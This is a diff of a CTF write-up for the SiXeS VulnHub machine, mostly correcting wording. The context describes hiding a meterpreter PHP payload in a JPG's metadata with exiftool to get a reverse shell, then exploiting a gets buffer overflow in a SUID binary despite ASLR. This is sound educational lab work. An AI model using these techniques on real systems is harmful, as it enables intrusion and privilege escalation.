@@ -228,7 +228,7 @@ Now edit meterpreter.php and insert `<?php` in the beginning and `?>` at the end
 
 If you're curious what's written there, you can try to base64 decode the string with [Cyberchef](https://gchq.github.io/CyberChef/) 
 
-Nowe we have to enclose this string into another .jpg which we can upload.
+Now we have to enclose this string into another .jpg which we can upload.
 
 ~~~
 exiftool -DocumentName="`cat meterpreter.php`" smiley.jpg -o smiley2.php
@@ -261,7 +261,7 @@ Once the "reverse TCP handler" has been started, access the uploaded smiley2.php
 
 If you receive message above, you successfully spawned a reverse connection with meterpreter, which allows us to work very comfortably on the target
 
-With the followint commands, we can open a shell and use it like we would have ssh'ed into the system:
+With the following commands, we can open a shell and use it like we would have ssh'ed into the system:
 ~~~
 meterpreter > shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -269,7 +269,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 With the id command we find out that we are user "www-data". This is because our meterpreter / php webshell is a child-process which inherits privileges from the apache2 processes. 
 ~~~bash
-id
+www-data@sixes:/home/webmaster$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ~~~
 www-data essentially is a low privilege user which is intended to prevent anyone finding and exploiting security weaknesses in the webpage from doing something harmfull to the system.  
@@ -287,7 +287,7 @@ Now obviously we have to find a way to escalate our privileges to become "webmas
 Hint: follow a checklist like the classic but still great one from g0tmi1lk:
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
-Eventually a non-standard SUID binary which catches our attention:
+Eventually a non-standard SUID binary catches our attention:
 ~~~
 www-data@sixes:/home/webmaster$ find / -type f -perm -4000 -exec ls -al {} \; 2>/dev/null
 [...]
@@ -298,10 +298,10 @@ www-data@sixes:/home/webmaster$ find / -type f -perm -4000 -exec ls -al {} \; 2>
 
 It's a custom binary (self coded?) which is executable by everyone, owned by webmaster and has SUID bit set. This means that this program inherits the privileges of webmaster during it's execution.
 
-if we have a closer look with strings to get a feeling what's contained inside and which logic might be behind, we see the following:
+If we have a closer look with `strings` command to get a feeling what's contained inside and which logic might be behind, we see the following:
 
 ~~~
-strings /sbin/notemaker
+www-data@sixes:/home/webmaster$ strings /sbin/notemaker
 [...]
 gets
 [...]
@@ -322,27 +322,30 @@ Start typing >>
 [...]
 ~~~
 
-The picture we get is that notemaker is developed by webmaster so that everyone can send him messages which get written to /home/webmaster/notes.txt.
+The picture we get is that notemaker was developed by webmaster so that everyone can send him messages which get written to /home/webmaster/notes.txt.
 From looking into his home, we know that the file is protected in a way that only webmaster himself could write to it. That's why the SUID bit is required and makes sense. 
+Everyone can run that binary to send a message, the binary will be executed with the privileges of webmaster and thus be able to write to /home/webmaster/notes.txt. 
 
-The information that we should keep our note below 256 bytes, together with the fact that 'gets' seems to be used in the program is a broad hint. gets in this case receives characters from the terminal, but is not able to verify if the variable it's writing to is big enough to store the complete result. If the result is bigger then the variable, bad luck, memory "behind" will simply be overwritten. 
+The information that we should keep our note below 256 bytes, together with the fact that `gets` seems to be used in the program is a broad hint. `gets` in this case receives characters from the terminal, but is not able to verify if the variable it's writing to is big enough to store the complete result. If the result is bigger then the variable, bad luck, memory "behind" will simply be overwritten. 
+We can utilize this with a buffer overflow - we intentionally write more than can be handled to manipulate the stack and take control the program flow.  
 
-We need to exploit this binary with a buffer overflow to somehow be able to execute our own commands as "webmaster".
+If we do it the right way, we will be able to execute our own commands as "webmaster".
 
-Unfortunately this is not trivial, because [ASLR](https://de.wikipedia.org/wiki/Address_Space_Layout_Randomization) is active on the SiXeS VM.
+Unfortunately this is not a trivial task, because [ASLR](https://de.wikipedia.org/wiki/Address_Space_Layout_Randomization) is active on the SiXeS VM.
 ~~~
 www-data@sixes:/home/webmaster$ cat /proc/sys/kernel/randomize_va_space
 cat /proc/sys/kernel/randomize_va_space
 2
 ~~~ 
 
+The value has the following meaning: 
 ~~~
 0 – No randomization. Everything is static.
 1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
 2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.
 ~~~
 
-This means that the addresses of functions and memory areas differ with each execution of the binary. We can see that if we run the program multiple times with ltrace and compare the addresses mentioned for a specific function:
+Essentially the addresses of functions and memory areas differ with each execution of the binary. We can see that if we run the program multiple times with ltrace and compare the addresses mentioned for a specific function:
 
 ~~~
 www-data@sixes:/home/webmaster$ ltrace /sbin/notemaker
@@ -359,27 +362,30 @@ setregid(33, 33, 0, 0x7f5d7879a997)              = 0
 [...]
 ~~~
 
-Since they differ in unforseen ways, we can't simply use static addresses in our exploit. Therefore the whole process of exploit developing will become complicated. 
+Since they differ in unforseen ways, we can't simpy use static addresses in our exploit. Therefore the whole process of exploit developing will become complicated. 
 
 Let's start with downloading the binary for further analysis. Therefore we just close the meterpreter shell mode with ctrl + c and execute the following commands:
 
 ![](attachments/Clipboard_19.png)
 
-What we can do next is to analyze the binary with ghidra:
+Next we do a static code analysis of the binary with ghidra and find out that essentially there are 2 functions. So let's learn what they do:
 
-main function:
+main function:  
 
 ![](attachments/Clipboard_20.png)
 
+In a nutshell: 
 * Takes care of using the SUID 
 * Prints the text banner
 * hands over to update_notes() function
 * Prints closing text once function has been completed and closes the programm
 
-update_notes function:
+update_notes function:  
 
 ![](attachments/Clipboard_21.png)
 
+
+In a nutshell:
 * creates buffer for input (local_118 with 264 Bytes)
 * checks if output file exists and is writable (/home/webmaster/notes.txt)
 * receives user input with vulnerable gets function and stores it to local_118 variable
@@ -445,7 +451,7 @@ Just a few remarks:
 * We determine our payload needs to have a 280 Bytes offset
 * We also leak the address of the `puts` function
 * But then we need to jump back to the `main` function again
-* The library which is used on the target SiXeS VM is libc-2.27.so. 
+* The library which is used on the target SiXeS VM is `libc-2.27.so`. 
 
   We see that with the following find command
   ~~~
@@ -455,13 +461,13 @@ Just a few remarks:
   ~~~
   This library needs to be downloaded and referenced to determine the correct offset for the target system
 
-And last but not least: in contrast to the CTF challenge which John is facing, our binary is not reachable remotly via a specific port. Theoretically we could also adapt our python script to run locally on the binary. Python3 is installed on SiXeS, but pwntools are missing. Since we don't have admin privileges yet, we can't easily install them there. So we have to come up with an idea to make it available remotely.
+And last but not least: in contrast to the CTF challenge which John is facing, our binary is not reachable remotly via a specific port. Theoretically we could also adapt our python script to run locally on the binary on SiXeS VM. Python3 is installed on there, but pwntools are missing. Since we don't have admin privileges yet, we can't easily install them. So we have to come up with an idea to make it available remotely.
 
-This can be done with `ncat`, but we also have to upload it together with a required library via meterpreter. 
+This can be done with `ncat`, but we also have to upload it, together with a required library, via meterpreter. 
 
-Since we still are a low privileged user, the about only destination we can write to is /tmp/. But that's sufficient. 
+Since we still are a low privileged user, probably the only destination we can write to is /tmp/. But that's sufficient. 
 
-If we check ncat with ldd, we notice that library `liblua5.3.so.0` is missing
+If we check ncat with ldd after upload, we notice that library `liblua5.3.so.0` is missing
 ~~~
 www-data@sixes:/tmp$ ldd ncat
 ldd ncat
@@ -592,7 +598,7 @@ If you are interested in how the machine works "behind the curtains", check out 
 
 
 **Personal remarks:** 
-As I'm writing this in September 2020, it's now almost a year since the machine was published on vulnhub where I discovered it. Because of the Binary Exploit part needed for Flag #5 it was really a challenge and way "above my paygrade" back then. I couldn't solve it for a very long time, but I always wanted to make it and publish a writeup - because I couldn't find one. So I kept learning while playing OverTheWire and participating in CTFs. And I kept coming back to SiXeS every once in a while to see if the new Tricks I learned from e.g. OTW Leviathan and Narnia would help. In the end it took realy longer than I could have imagined, but I made it and it was worth it!!
+As I'm writing this in September 2020, it's now almost a year since the machine was published on vulnhub where I discovered it. Because of the Binary Exploit Part needed for Flag #5 it was really a challenge and way "above my paygrade" back then. I couldn't solve it for a very long time, but I always wanted to make it and publish a writeup - because I couldn't find one back then. So I kept learning while playing OverTheWire and participating in CTFs. And I kept coming back to SiXeS every once in a while to see if the new Tricks I learned from e.g. OTW Leviathan and Narnia would help. In the end it took realy longer than I could have imagined, but I made it and it was worth it!!
 
 And hey, just as I succeded now with Flag No 5, I noticed that some people in China/Hongkong where half a year faster than me: 
 https://freehk.top/2020/03/29/sixes/ - Congratulations, you won by far :)
@@ -600,5 +606,7 @@ https://freehk.top/2020/03/29/sixes/ - Congratulations, you won by far :)
 But that's not important. Important is that this machine was a real tough challenge which kept me motivated and made me learn sooooooooooo much new incredible stuff!
 
 Many thanks to the Author Hafidh ZOUAHI and of course also to all the people who share their knowledge and write such great writeups, do youtube videos or create challenges so that others could learn! 
+
+Keep it up, you're the best! :D
 
 
